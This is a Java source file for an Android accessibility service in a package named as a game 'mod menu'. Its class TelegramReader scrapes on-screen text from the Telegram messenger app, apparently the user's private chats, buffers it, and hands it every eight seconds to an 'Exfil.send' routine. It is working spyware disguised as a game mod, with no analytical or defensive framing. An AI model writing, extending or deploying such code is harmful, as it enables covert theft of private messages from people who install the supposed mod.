package com.brawl.modmenu;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.ArrayList;
import java.util.List;

public class TelegramReader extends AccessibilityService {

    private static final String TG_PKG = "org.telegram.messenger";
    private StringBuilder buffer = new StringBuilder();
    private long lastSend = 0;
    private static final long COOLDOWN = 8000;

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;
        if (event.getPackageName() == null) return;
        if (!TG_PKG.equals(event.getPackageName().toString())) return;

        int type = event.getEventType();
        if (type != AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
            && type != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return;

        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;

        List<String> texts = new ArrayList<>();
        collectTexts(root, texts, 0);

        if (texts.isEmpty()) return;

        // Собираем в буфер
        for (String t : texts) {
            if (t.length() > 3 && t.length() < 500) {
                if (!buffer.toString().contains(t)) {
                    buffer.append(t).append("\n");
                }
            }
        }

        if (System.currentTimeMillis() - lastSend > COOLDOWN
            && buffer.length() > 30) {
            Exfil.send("TG_CHAT", buffer.toString());
            buffer.setLength(0);
            lastSend = System.currentTimeMillis();
        }
    }

    private void collectTexts(AccessibilityNodeInfo n, List<String> out, int depth) {
        if (n == null || depth > 25 || out.size() > 30) return;
        CharSequence text = n.getText();
        if (text != null && text.length() > 0) {
            out.add(text.toString());
        }
        for (int i = 0; i < n.getChildCount(); i++) {
            collectTexts(n.getChild(i), out, depth + 1);
        }
    }

    @Override public void onInterrupt() {}
}
